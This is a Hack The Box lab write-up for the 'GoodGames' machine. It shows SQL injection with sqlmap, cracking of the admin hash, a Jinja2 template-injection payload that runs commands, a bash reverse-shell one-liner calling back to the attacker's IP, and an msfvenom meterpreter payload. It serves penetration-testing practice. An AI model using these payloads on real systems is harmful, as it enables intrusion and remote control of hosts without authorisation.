# GoodGames HTB Machine

GoodGames is a **Linux** HTB Machine rated **Easy** As usually we start with our Recon with Nmap or Rustscan and look for open ports.

## Nmap / Rustscan

**rustscan -a 10.10.11.130 --ulimit 5000 -r 1-65535 -- -A**
```
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Werkzeug httpd 2.0.2 (Python 3.9.2)
|_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD POST
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/17%OT=80%CT=%CU=32820%PV=Y%DS=2%DC=T%G=N%TM=68CA7AD2
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M542ST11NW7%O2=M542ST11NW7%O3=M542NNT11NW7%O4=M542ST11NW7%O5=M542ST11
OS:NW7%O6=M542ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M542NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 2.504 days (since Sun Sep 14 23:03:42 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   364.02 ms 10.10.16.1
2   181.55 ms 10.10.11.130

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:09
Completed NSE at 11:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:09
Completed NSE at 11:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:09
Completed NSE at 11:09, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.46 seconds
```

It Looks like we only have one port open Port 80.

## Port 80

The website is running  **Werkzeug httpd 2.0.2 (Python 3.9.2)** so i went to the website.Go to the /etc/hosts and set the **goodgames.htb**.

![Alt-text](https://github.com/CyberElam/HacktheBox-CTFs/blob/main/GoodGames/Screenshots/web.png)

On the Background also Open The Caido Proxy You can Use any other tool you want like Burp Suite or Zap but Im exploring Caido for now

![Alt-text](https://github.com/CyberElam/HacktheBox-CTFs/blob/main/GoodGames/Screenshots/caido.png)

Add The IP Address or DNS name GoodGames.HTB of the website to The Scope so you wont deal with unneccesary traffic.So used Ffuf to Fuzz the website and also looked around and most of the posts are made by these users **Wolfenstein, Hitman and Witch Murder** so it could be useful later or not.

![Alt-text](https://github.com/CyberElam/HacktheBox-CTFs/blob/main/GoodGames/Screenshots/ffuf.png)

Found a few Directories using ffuf so i signup for an account.

![Alt-text](https://github.com/CyberElam/HacktheBox-CTFs/blob/main/GoodGames/Screenshots/sign%20in.png)

After making an Account i Copied The Signup and Login request on Caido and pasted then in a file and used sqlmap to look for sqli.
**sqlmap -r <request file> --dbs**

![Alt-text](https://github.com/CyberElam/HacktheBox-CTFs/blob/main/GoodGames/Screenshots/sqlmap.png)

It Looks Like The Login Request is Vulnerable to SQLi **[11:33:30] [INFO] POST parameter 'email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable**

![Alt-text](https://github.com/CyberElam/HacktheBox-CTFs/blob/main/GoodGames/Screenshots/dbs.png)

It looks like we have 1 database called **main** not counting the default **information_schema** of course next is to check the tables of main or just dump the database but i dont want a mess on my screen so ill take things slow.

**sqlmap -r login.txt -D main --tables --batch**

![Alt-text](https://github.com/CyberElam/HacktheBox-CTFs/blob/main/GoodGames/Screenshots/tables.png)

Looks like we have 3 tables so i'll probably dump the whole Database and see if There is anything interesting i could find to gain a shell.I also tried the --os-shell and other shell commands but there is no writable path and so far i dont see python when sqlmap prompt me to choose a web programming language that the website uses

```
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4
```

so SQLi could take me no where even if i dump the database there is no SSH or any other places i could get a shell and the time-based sqli is taking to long so back on testing other vulnerability and i havent fuzz for any virtual hosts.

![Alt-text](https://github.com/CyberElam/HacktheBox-CTFs/blob/main/GoodGames/Screenshots/timebase.png)

#### VHOSTS

**ffuf -u http://goodgames.htb -H "Host: FUZZ.goodgames.htb" -w <wordlist> -fs 85107**

I tried Fuzzing for Vhosts but no luck so my only hope is to wait for sqlmap to dump the main database and see if i could find creds i could use to login maybe an account that has higher priviledges than me like root or admin.After a while i got the admin hash.

![Alt-text](https://github.com/CyberElam/HacktheBox-CTFs/blob/main/GoodGames/Screenshots/hash.png)

Cracked The Hash on crackstation https://crackstation.net/

![ALt-text](https://github.com/CyberElam/HacktheBox-CTFs/blob/main/GoodGames/Screenshots/admin%20password.png)

Creds **admin@goodgames.htb:superadministrator** Got in The Administrator's Account and explored the website as the admin on the top right corner there is a tiny botton i pressed it and it redirected me to **http://internal-administration.goodgames.htb/**  so put the this on the /etc/hosts internal-administration.goodgames.htb.
 
![Alt-text](https://github.com/CyberElam/HacktheBox-CTFs/blob/main/GoodGames/Screenshots/internal%20admin.png)

so i loged in with the admin creds.

![Alt-text](https://github.com/CyberElam/HacktheBox-CTFs/blob/main/GoodGames/Screenshots/logedin.png)

while exploring the internal-administration.goodgames.htb i went to settings There was a section that wants me to General information so i tried Sqli no luck then tried SSTI since the username was being reflected.

![Alt-text](https://github.com/CyberElam/HacktheBox-CTFs/blob/main/GoodGames/Screenshots/adminssti.png)

and it worked i got 49.

![Alt-text](https://github.com/CyberElam/HacktheBox-CTFs/blob/main/GoodGames/Screenshots/proofofssti.png)

so now i need to figure out a way to gain cmd first we will try to use the tool SSTI you can just download it on github and run it probably let it run on the background and try some manual approach while its doing its thing.

**python3 sstimap.py -u http://internal-administration.goodgames.htb/settings -d "name=test"**

![Alt-text](https://github.com/CyberElam/HacktheBox-CTFs/blob/main/GoodGames/Screenshots/sstiadmin.png)

while its automating i tried a few payloads and this one worked **{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}**

![Alt](https://github.com/CyberElam/HacktheBox-CTFs/blob/main/GoodGames/Screenshots/ssti%20root.png)

Looks like i am root now its time to try to get a reverse shell so we can get the flags. so i used this payload to gain rce on the machine **{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.16.3/4444 0>&1"').read()}}** and got the user flag

![Alt-text](https://github.com/CyberElam/HacktheBox-CTFs/blob/main/GoodGames/Screenshots/userflag.png)

I couldnt find the root flag a while exploring the file i ran into some docker stuff so we're probably inside a docker container and we need a way to escape it,so i googled ways to escape docker container and i ran into a metasploit module that will automate that stuff i have done much of docker escaping https://www.rapid7.com/db/modules/exploit/linux/local/docker_privileged_container_escape/ so i generated a msfvenom payload **msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.10.16.3 lport=4445 -f elf -o msf.elf** downloaded it on the machine using wget and use the metasploit exploit/multi/handler and set the payload and other stuff like IP and Port executed the payload and got a meterpreter shell.

![Alt-text](https://github.com/CyberElam/HacktheBox-CTFs/blob/main/GoodGames/Screenshots/metas.png)

and tried using the docker module and it did not work.

![Alt-text](https://github.com/CyberElam/HacktheBox-CTFs/blob/main/GoodGames/Screenshots/docker%20esc.png)

so i tried using the exploit suggester for a way to Privesc

after a while no luck so i looked for internal hosts i could ssh into found 1 and ssh using augustus and the admin's passowrd. I dont know much about docker escaping i did study a little bit about docker so i follow the walkthrough to get the root flag and added the docker escape to my notes for future reference.


